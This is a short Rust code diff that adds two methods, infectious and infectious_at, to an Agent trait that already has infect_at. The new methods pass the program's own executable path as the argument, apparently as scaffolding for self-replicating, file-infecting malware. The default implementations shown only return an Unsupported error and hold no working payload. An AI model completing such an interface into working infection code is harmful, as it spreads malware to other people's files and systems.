@@ -32,4 +32,13 @@ pub trait Agent: Sync {
     async fn infect_at(&self, _target: PathBuf, _exe: PathBuf) -> AppResult<bool> {
         Err(Error::Unsupported)
     }
+
+    async fn infectious(&self, target: PathBuf) -> AppResult<bool> {
+        self.infectious_at(target, env::current_exe()?.to_path_buf())
+            .await
+    }
+
+    async fn infectious_at(&self, _target: PathBuf, _exe: PathBuf) -> AppResult<bool> {
+        Err(Error::Unsupported)
+    }
 }
